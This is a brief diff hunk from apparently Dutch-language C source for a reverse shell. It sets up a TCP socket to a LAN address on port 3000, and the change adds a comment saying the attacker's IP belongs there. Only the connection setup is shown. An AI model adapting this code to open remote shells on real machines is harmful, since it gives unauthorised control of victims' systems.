@@ -24,7 +24,7 @@ int main(){
 	socket_info = socket(AF_INET, SOCK_STREAM, 0);
     aanvaller_info.sin_family = AF_INET;
     aanvaller_info.sin_port = htons(3000);
-    aanvaller_info.sin_addr.s_addr = inet_addr("192.168.0.105");
+    aanvaller_info.sin_addr.s_addr = inet_addr("192.168.0.105"); //since this is a reverse shell, the 'attacker's IP address should be put here.
 	printf("Set data.\n");
 	
 	printf("Probeert connectie te maken.\n");
